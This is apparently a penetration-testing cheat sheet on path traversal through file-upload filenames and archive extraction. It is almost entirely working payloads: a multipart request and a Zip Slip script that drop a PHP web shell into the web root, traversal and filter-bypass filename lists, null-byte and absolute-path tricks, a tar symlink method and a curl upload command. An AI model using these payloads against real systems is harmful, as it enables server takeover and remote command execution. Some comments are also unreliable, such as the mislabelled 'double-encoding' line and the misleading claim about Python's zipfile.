# File Upload - Path Traversal

## Filename-Based Path Traversal
```
POST /upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"

<?php system($_GET['c']); ?>
```

## Common Traversal Payloads for Filename
```
../shell.php
../../shell.php
....//....//shell.php          # Double-encoding defeats naive replace of "../"
..%2f..%2fshell.php
..%252f..%252fshell.php        # Double URL-encoded
..\..\shell.php                # Windows-style backslash
```

## Null Byte + Traversal (older PHP < 5.3.4)
```
filename="../../../var/www/html/shell.php%00.jpg"
```

## Absolute Path Injection
```
filename="/var/www/html/shell.php"
filename="C:\inetpub\wwwroot\shell.aspx"
```

## Bypass Blacklist Filter on "../"
```
....//                          # After removing "../" once, leaves "../"
..././                          # Similar technique
..\/..\/                        # Mixed slash types
```

## Zip Slip (Archive Extraction Path Traversal)
```python
import zipfile

zf = zipfile.ZipFile('evil.zip', 'w')
zf.writestr('../../../var/www/html/shell.php', '<?php system($_GET["c"]); ?>')
zf.close()
```
If the server extracts uploaded ZIP/TAR without sanitizing entry paths, this writes outside the intended directory.

### Zip Slip via Symlink (Tar)
```bash
# Create a symlink pointing outside extraction dir, then write through it
ln -s /var/www/html/ evil_link
tar -cvf evil.tar evil_link
# Some extractors will follow symlink and write into target dir
```

## Testing Multipart Filename Field Directly
```bash
curl -X POST https://target.com/upload \
  -F 'file=@shell.php;filename=../../../../var/www/html/shell.php'
```

## Testing Checklist
```
1. Try relative traversal in filename field (many frameworks don't sanitize this)
2. Try both URL-encoded and raw traversal sequences
3. If archive upload (zip/tar/rar) supported, test Zip Slip
4. Combine with null byte if legacy PHP suspected
5. Try absolute path injection if app doesn't validate for leading '/'
```

## Related Framework-Specific Notes
```
- Node.js archiver libraries: check CVEs for specific extract() implementations
- Java: Apache Commons Compress had Zip Slip CVEs historically
- Python: zipfile.extractall() does NOT protect against path traversal by default (< Python 3.x hardening)
```
